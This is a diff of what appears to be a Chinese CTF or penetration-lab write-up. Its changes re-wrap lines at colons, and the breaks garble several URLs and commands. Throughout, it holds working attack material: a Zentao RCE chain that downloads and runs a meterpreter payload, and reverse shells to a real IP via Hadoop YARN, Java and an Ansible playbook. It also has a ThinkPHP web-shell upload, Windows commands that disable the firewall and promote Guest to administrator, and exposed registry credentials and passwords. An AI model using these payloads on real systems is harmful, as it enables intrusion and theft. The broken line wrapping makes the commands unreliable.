@@ -46,7 +46,11 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port 
 python3 -m http.server local_port_2
 
 #下载反弹shell payload
-./zentao -c "curl http://local_host:local_port/a -o /tmp/a" -u http://local_host:local_port_2#赋予权限./zentao -c "chmod 777 /tmp/a" -u http://target_host:target_port#执行./zentao -c "/bin/bash /tmp/a" -u http://target_host:target_port
+./zentao -c "curl http://local_host:
+local_port/a -o /tmp/a" -u http://local_host:
+local_port_2#赋予权限./zentao -c "chmod 777 /tmp/a" -u http://target_host:
+target_port#执行./zentao -c "/bin/bash /tmp/a" -u http://target_host:
+target_port
 
 flag2
 
@@ -60,7 +64,8 @@ flag3
 
 #!/usr/bin/env python
 import requests
-target = 'http://127.0.0.1:8088/'lhost = '192.168.0.1' # put your local host ip here, and listen at port 9999
+target = 'http://127.0.0.1:
+8088/'lhost = '192.168.0.1' # put your local host ip here, and listen at port 9999
 url = target + 'ws/v1/cluster/apps/new-application'resp = requests.post(url)app_id = resp.json()['application-id']url = target + 'ws/v1/cluster/apps'data = {    'application-id': app_id,    'application-name': 'get-shell',    'am-container-spec': {        'commands': {            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,        },    },    'application-type': 'YARN',}requests.post(url, json=data)
 
 flag4
@@ -77,7 +82,8 @@ flag5
 
 https://github.com/Mr-xn/sunlogin_rce
 
-reg add "HKLMSYSTEMCurrentControlSetControlTerminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f//开启远程桌面 netsh advfirewall set allprofiles state off//关闭防火墙 net user Guest /active:yes//启用guest用户 net localgroup administrators Guest /add //加入administrators组 net user guest Admin@123 //修改密码为Admin@123
+reg add "HKLMSYSTEMCurrentControlSetControlTerminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f//开启远程桌面 netsh advfirewall set allprofiles state off//关闭防火墙 net user Guest /active:
+yes//启用guest用户 net localgroup administrators Guest /add //加入administrators组 net user guest Admin@123 //修改密码为Admin@123
 
 flag6
 
@@ -95,25 +101,38 @@ flag9
 
 flag10
 
-http://target_url:port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=file_put_contents&vars[1][]=a.php&vars[1][]=PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=http://target_url:port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=passthru&vars[1][0]=echo YmFzZTY0IC1kIGEucGhwID4gc2hlbGwucGhw |base64 -d|bash
+http://target_url:
+port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=file_put_contents&vars[1][]=a.php&vars[1][]=PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=http://target_url:
+port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=passthru&vars[1][0]=echo YmFzZTY0IC1kIGEucGhwID4gc2hlbGwucGhw |base64 -d|bash
 
 flag11
 
 Java.perform(function() {  Java.choose("java.lang.String", {    onComplete: function() {    },    onMatch: function(instance) {      if(instance){        console.log(instance);        // printStack();       }    }  });});
 
-// 查看所有镜像root@ubuntu:~# proxychains curl -u pineapple:123qwe2wsxcde3 http://10.10.100.43:5000/v2/_catalog{"repositories":["flag","myapp","spring-boot-minio","ubuntu"]}
+// 查看所有镜像root@ubuntu:~# proxychains curl -u pineapple:
+123qwe2wsxcde3 http://10.10.100.43:
+5000/v2/_catalog{"repositories":["flag","myapp","spring-boot-minio","ubuntu"]}
 
-// /etc/docker/daemon.json{        "insecure-registries":["10.10.100.43:5000"]}
+// /etc/docker/daemon.json{        "insecure-registries":["10.10.100.43:
+5000"]}
 
-// ~/.docker/config.json{        "auths": {                "http://10.10.100.43:5000": {                        "auth": "cGluZWFwcGxlOjEyM3F3ZTJ3c3hjZGUz"                }        }}
+// ~/.docker/config.json{        "auths": {                "http://10.10.100.43:
+5000": {                        "auth": "cGluZWFwcGxlOjEyM3F3ZTJ3c3hjZGUz"                }        }}
 
 // /etc/systemd/system/docker.service.d/https-proxy.conf
-[Service]Environment="HTTP_PROXY=socks5://xxx.xxx.xxx.xxx:xxx"
+[Service]Environment="HTTP_PROXY=socks5://xxx.xxx.xxx.xxx:
+xxx"
 
 systemctl daemon-reloadsystemctl restart docker
 
-docker pull 10.10.100.43:5000/spring-boot-minio:latestdocker pull 10.10.100.43:5000/flag:latest
-docker run -itd --name flag-test 10.10.100.43:5000/flag:latest /bin/bash
+docker pull 10.10.100.43:
+5000/spring-boot-minio:
+latestdocker pull 10.10.100.43:
+5000/flag:
+latest
+docker run -itd --name flag-test 10.10.100.43:
+5000/flag:
+latest /bin/bash
 
 flag12
 
@@ -212,143 +231,52 @@ flag15
 
 ```
 禅道v18.0.beta1 RCE漏洞，漏洞利用工具：https://github.com/0xf4n9x/Zentao-Captcha-RCE
-```
-
-
-
-```
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port -f elf > a
-```
-
-
-
-```
 python3 -m http.server local_port_2
-```
-
-
-
-```
 #下载反弹shell payload
-./zentao -c "curl http://local_host:local_port/a -o /tmp/a" -u http://local_host:local_port_2#赋予权限./zentao -c "chmod 777 /tmp/a" -u http://target_host:target_port#执行./zentao -c "/bin/bash /tmp/a" -u http://target_host:target_port
-```
-
-
-
-```
+./zentao -c "curl http://local_host:
+local_port/a -o /tmp/a" -u http://local_host:
+local_port_2#赋予权限./zentao -c "chmod 777 /tmp/a" -u http://target_host:
+target_port#执行./zentao -c "/bin/bash /tmp/a" -u http://target_host:
+target_port
 cat /www/zentaopms/config/my.php
-```
-
-
-
-```
 admin@mail.yym1ng.com1qazcde3!@#
-```
-
-
-
-```
 #!/usr/bin/env python
 import requests
-target = 'http://127.0.0.1:8088/'lhost = '192.168.0.1' # put your local host ip here, and listen at port 9999
+target = 'http://127.0.0.1:
+8088/'lhost = '192.168.0.1' # put your local host ip here, and listen at port 9999
 url = target + 'ws/v1/cluster/apps/new-application'resp = requests.post(url)app_id = resp.json()['application-id']url = target + 'ws/v1/cluster/apps'data = {    'application-id': app_id,    'application-name': 'get-shell',    'am-container-spec': {        'commands': {            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,        },    },    'application-type': 'YARN',}requests.post(url, json=data)
-```
-
-
-
-```
 ftpwsfxsdfrsaqwczdsa
-```
-
-
-
-```
 // hintwindows: 192.168.10.55
-```
-
-
-
-```
-reg add "HKLMSYSTEMCurrentControlSetControlTerminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f//开启远程桌面 netsh advfirewall set allprofiles state off//关闭防火墙 net user Guest /active:yes//启用guest用户 net localgroup administrators Guest /add //加入administrators组 net user guest Admin@123 //修改密码为Admin@123
-```
-
-
-
-```
+reg add "HKLMSYSTEMCurrentControlSetControlTerminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f//开启远程桌面 netsh advfirewall set allprofiles state off//关闭防火墙 net user Guest /active:
+yes//启用guest用户 net localgroup administrators Guest /add //加入administrators组 net user guest Admin@123 //修改密码为Admin@123
 yujianxgMZCiP6gfusWj3
-```
-
-
-
-```
 try {            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/124.221.207.31/1234 0>&1"};            Runtime.getRuntime().exec(cmd);        } catch (IOException e) {            e.printStackTrace();        }
-```
-
-
-
-```
 admin123456
-```
-
-
-
-```
-http://target_url:port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=file_put_contents&vars[1][]=a.php&vars[1][]=PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=http://target_url:port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=passthru&vars[1][0]=echo YmFzZTY0IC1kIGEucGhwID4gc2hlbGwucGhw |base64 -d|bash
-```
-
-
-
-```
+http://target_url:
+port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=file_put_contents&vars[1][]=a.php&vars[1][]=PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=http://target_url:
+port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=passthru&vars[1][0]=echo YmFzZTY0IC1kIGEucGhwID4gc2hlbGwucGhw |base64 -d|bash
 Java.perform(function() {  Java.choose("java.lang.String", {    onComplete: function() {    },    onMatch: function(instance) {      if(instance){        console.log(instance);        // printStack();       }    }  });});
-```
-
-
-
-```
-// 查看所有镜像root@ubuntu:~# proxychains curl -u pineapple:123qwe2wsxcde3 http://10.10.100.43:5000/v2/_catalog{"repositories":["flag","myapp","spring-boot-minio","ubuntu"]}
-```
-
-
-
-```
-// /etc/docker/daemon.json{        "insecure-registries":["10.10.100.43:5000"]}
-```
-
-
-
-```
-// ~/.docker/config.json{        "auths": {                "http://10.10.100.43:5000": {                        "auth": "cGluZWFwcGxlOjEyM3F3ZTJ3c3hjZGUz"                }        }}
-```
-
-
-
-```
+// 查看所有镜像root@ubuntu:~# proxychains curl -u pineapple:
+123qwe2wsxcde3 http://10.10.100.43:
+5000/v2/_catalog{"repositories":["flag","myapp","spring-boot-minio","ubuntu"]}
+// /etc/docker/daemon.json{        "insecure-registries":["10.10.100.43:
+5000"]}
+// ~/.docker/config.json{        "auths": {                "http://10.10.100.43:
+5000": {                        "auth": "cGluZWFwcGxlOjEyM3F3ZTJ3c3hjZGUz"                }        }}
 // /etc/systemd/system/docker.service.d/https-proxy.conf
-[Service]Environment="HTTP_PROXY=socks5://xxx.xxx.xxx.xxx:xxx"
-```
-
-
-
-```
+[Service]Environment="HTTP_PROXY=socks5://xxx.xxx.xxx.xxx:
+xxx"
 systemctl daemon-reloadsystemctl restart docker
-```
-
-
-
-```
-docker pull 10.10.100.43:5000/spring-boot-minio:latestdocker pull 10.10.100.43:5000/flag:latest
-docker run -itd --name flag-test 10.10.100.43:5000/flag:latest /bin/bash
-```
-
-
-
-```
+docker pull 10.10.100.43:
+5000/spring-boot-minio:
+latestdocker pull 10.10.100.43:
+5000/flag:
+latest
+docker run -itd --name flag-test 10.10.100.43:
+5000/flag:
+latest /bin/bash
 admingygsud7gbskdbbxd3rtqak
-```
-
-
-
-```
 [{     "name": "RCE playbook",     "hosts": "all",     "tasks": [       {         "name": "this runs in Celery container",         "shell": "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIxLjIwNy4zMS8xMjM0IDA+JjE=|base64 -d|bash -i",         "u0064elegate_to": "localhost" } ],     "vars": {     "ansible_u0063onnection": "local"     } }]
 ```
 
